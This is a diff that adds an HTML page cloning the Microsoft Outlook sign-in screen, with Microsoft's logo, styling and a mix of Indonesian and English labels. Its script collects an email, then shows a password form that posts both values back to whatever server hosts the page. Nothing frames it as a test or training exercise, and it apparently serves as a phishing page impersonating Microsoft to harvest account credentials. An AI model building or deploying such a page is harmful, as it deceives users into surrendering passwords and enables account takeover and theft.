@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Masuk - Microsoft Outlook</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f3f3f3;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            background-color: #ffffff;
+            border-radius: 2px;
+            padding: 44px;
+            max-width: 440px;
+            width: 100%;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .logo img {
+            height: 24px;
+            width: auto;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 8px;
+            text-align: center;
+        }
+
+        .subtitle {
+            font-size: 15px;
+            color: #1b1b1b;
+            margin-bottom: 24px;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 15px;
+            color: #1b1b1b;
+            margin-bottom: 8px;
+            font-weight: 400;
+        }
+
+        input[type="text"],
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px 12px;
+            font-size: 15px;
+            border: 1px solid #8a8886;
+            border-radius: 2px;
+            outline: none;
+            transition: all 0.1s;
+            background-color: #fff;
+        }
+
+        input[type="text"]:hover,
+        input[type="email"]:hover,
+        input[type="password"]:hover {
+            border-color: #323130;
+        }
+
+        input[type="text"]:focus,
+        input[type="email"]:focus,
+        input[type="password"]:focus {
+            border-color: #0078d4;
+            border-width: 2px;
+            padding: 9px 11px;
+        }
+
+        .forgot-link {
+            font-size: 13px;
+            color: #0067b8;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 8px;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background-color: #0067b8;
+            color: #ffffff;
+            border: none;
+            padding: 10px;
+            font-size: 15px;
+            font-weight: 600;
+            border-radius: 2px;
+            cursor: pointer;
+            transition: background-color 0.1s;
+            margin-top: 24px;
+        }
+
+        .submit-btn:hover {
+            background-color: #005a9e;
+        }
+
+        .submit-btn:active {
+            background-color: #004578;
+        }
+
+        .create-account {
+            font-size: 13px;
+            color: #0067b8;
+            text-decoration: none;
+            display: block;
+            text-align: center;
+            margin-top: 16px;
+        }
+
+        .create-account:hover {
+            text-decoration: underline;
+        }
+
+        .user-info {
+            background-color: #f3f2f1;
+            border: 1px solid #edebe9;
+            border-radius: 2px;
+            padding: 12px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #323130;
+        }
+
+        .user-info strong {
+            color: #1b1b1b;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: flex-start;
+            margin-top: 16px;
+        }
+
+        .checkbox-container input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+            margin-right: 8px;
+            margin-top: 2px;
+            cursor: pointer;
+        }
+
+        .checkbox-container label {
+            font-size: 13px;
+            color: #1b1b1b;
+            margin: 0;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft">
+        </div>
+        
+        <h1>Sign In</h1>
+        
+        <form id="emailForm">
+            <div class="form-group">
+                <label for="email">Email atau Phone Number</label>
+                <input type="text" id="email" name="email" required autofocus>
+            </div>
+
+            <div class="checkbox-container">
+                <input type="checkbox" id="keepSignedIn">
+                <label for="keepSignedIn">Remember</label>
+            </div>
+
+            <button type="submit" class="submit-btn">Next</button>
+
+            <a href="#" class="create-account">No account? Create one!</a>
+        </form>
+
+        <!-- Step 2: Password -->
+        <form id="passwordForm" action="" method="POST" style="display: none;">
+            <div class="form-group">
+                <div style="margin-bottom: 16px; padding: 12px; background-color: #f3f2f1; border-radius: 2px; border: 1px solid #edebe9; font-size: 13px; color: #323130;">
+                    <strong id="emailDisplay"></strong>
+                    
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required autofocus>
+                <a href="#" class="forgot-link">Forgot Password?</a>
+            </div>
+
+            <input type="hidden" id="emailHidden" name="email">
+
+            <div class="checkbox-container">
+                <input type="checkbox" id="keepSignedIn2">
+                <label for="keepSignedIn2">Remember</label>
+            </div>
+
+            <button type="submit" class="submit-btn">Next</button>
+
+            <a href="#" class="create-account">No account? Create one!</a>
+        </form>
+    </div>
+
+    <script>
+        // Two-step login
+        document.getElementById('emailForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value.trim();
+            
+            if (!email) {
+                alert('Email required');
+                return;
+            }
+            
+            // Show password step
+            document.getElementById('emailForm').style.display = 'none';
+            document.getElementById('passwordForm').style.display = 'block';
+            document.getElementById('emailDisplay').textContent = email;
+            document.getElementById('emailHidden').value = email;
+            document.getElementById('password').focus();
+        });
+
+        function goBackToEmail(e) {
+            if (e) e.preventDefault();
+            document.getElementById('emailForm').style.display = 'block';
+            document.getElementById('passwordForm').style.display = 'none';
+            document.getElementById('email').focus();
+        }
+    </script>
+</body>
+</html>
